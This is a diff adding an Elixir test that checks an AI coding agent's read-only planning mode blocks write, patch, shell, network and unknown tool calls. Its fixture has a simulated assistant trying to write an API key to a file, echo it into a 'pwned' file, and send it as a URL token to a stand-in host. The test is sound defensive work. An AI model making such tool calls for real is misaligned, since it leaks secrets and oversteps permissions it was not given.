@@ -221,6 +221,76 @@ defmodule Muse.M1ReadOnlyPlanningTest do
       assert assistant_text =~ "/approve plan",
              "Assistant text should contain approval instructions"
     end
+
+    @tag :m1_readonly
+    test "provider-requested write shell network and unknown destructive tools are blocked safely",
+         %{workspace: workspace} do
+      session_id = "m1-ro-blocked-#{:erlang.unique_integer([:positive])}"
+      fake_secret = "sk-test-m1-blocked-secret"
+      {before_paths, before_hashes} = workspace_snapshot(workspace)
+
+      pid = start_server(session_id)
+
+      fake_event_batches = [
+        [
+          {:assistant_delta, "I will inspect and must not mutate the workspace."},
+          {:tool_call, "write_file",
+           %{"path" => "lib/evil.ex", "content" => "API_KEY=#{fake_secret}"}, "call_write"},
+          {:tool_call, "patch_propose", %{"patch" => "API_KEY=#{fake_secret}"}, "call_patch"},
+          {:tool_call, "shell_command", %{"command" => "echo #{fake_secret} > pwned"},
+           "call_shell"},
+          {:tool_call, "network_call",
+           %{"url" => "https://example.invalid/?token=#{fake_secret}"}, "call_network"},
+          {:tool_call, "apply_patch", %{"patch" => "API_KEY=#{fake_secret}"}, "call_apply_patch"},
+          {:tool_call, "totally_unknown_tool", %{"api_key" => fake_secret}, "call_unknown"},
+          {:response_completed, nil}
+        ],
+        [
+          {:assistant_delta, "Blocked unsafe tool attempts. Here is the safe plan:\n\n"},
+          {:assistant_delta, @plan_json},
+          {:assistant_completed, @plan_json},
+          {:response_completed, nil}
+        ]
+      ]
+
+      {:ok, assistant_text} =
+        SessionServer.submit(pid, :cli, "plan without writing",
+          workspace: workspace,
+          prompt_opts: [project_rules?: false],
+          request_options: [options: %{fake_event_batches: fake_event_batches}]
+        )
+
+      status = SessionServer.status(pid)
+      assert status.status == :awaiting_plan_approval
+      assert %Plan{} = status.plan
+      assert assistant_text =~ "/approve plan"
+
+      {after_paths, after_hashes} = workspace_snapshot(workspace)
+      assert after_paths == before_paths
+      assert after_hashes == before_hashes
+      refute File.exists?(Path.join(workspace, "lib/evil.ex"))
+      refute File.exists?(Path.join(workspace, "pwned"))
+
+      events = State.events()
+      blocked_tools = events |> events_of_type(:tool_call_blocked) |> Enum.map(&tool_name/1)
+      failed_tools = events |> events_of_type(:tool_call_failed) |> Enum.map(&tool_name/1)
+
+      for tool_name <- [
+            "write_file",
+            "patch_propose",
+            "shell_command",
+            "network_call",
+            "apply_patch"
+          ] do
+        assert tool_name in blocked_tools
+      end
+
+      assert "totally_unknown_tool" in failed_tools
+
+      for event <- events do
+        refute inspect(event.data) =~ fake_secret
+      end
+    end
   end
 
   # -- Completion gate: public command lifecycle -------------------------------
@@ -523,6 +593,10 @@ defmodule Muse.M1ReadOnlyPlanningTest do
     ]
 
     refute Enum.any?(events, &(&1.type in forbidden_event_types))
+  end
+
+  defp events_of_type(events, type) do
+    Enum.filter(events, &(&1.type == type))
   end
 
   defp tool_name(%{data: data}) when is_map(data) do
